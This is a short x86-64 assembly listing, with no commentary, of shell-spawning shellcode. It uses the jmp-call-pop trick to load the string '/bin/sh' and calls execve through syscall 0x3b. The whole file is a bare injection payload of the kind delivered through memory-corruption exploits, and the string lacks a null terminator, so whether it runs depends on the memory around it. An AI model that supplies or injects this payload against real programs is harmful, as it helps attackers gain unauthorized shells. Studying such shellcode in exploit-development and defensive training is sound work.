bits 64
section .text
global _start

_start:
	jmp binsh

	exec:
	
	; execve("/bin/sh", NULL, NULL)
	
	xor rax, rax
	mov rsi, rax
	mov rdx, rax
	mov al, 0x3b
	pop rdi

	syscall

	binsh:
		call exec
		db "/bin/sh"